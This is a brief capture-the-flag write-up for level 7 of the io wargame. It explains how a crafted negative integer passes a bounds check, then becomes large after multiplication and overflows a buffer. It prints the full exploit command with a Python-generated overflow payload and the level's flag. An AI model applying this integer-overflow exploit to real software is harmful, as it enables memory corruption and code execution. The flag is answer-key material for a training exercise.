Integer Overflow.

To bypass the less than check, the number has to be such that it is interpreted as negative.
Also, when multiplied by 4 or num<<2, the num should become positive.

So, took number = 10000000000000000000000000010000 = -2147483632.
When multiplied by 4, the number becomes positive and large enough to overflow the buffer.

level7@io:/levels$ ./level07 -2147483632 `python -c 'print "A"*60 + "\x46\x4c\x4f\x57"'`

Flag: `31L5mKO0ZwTrLeFe`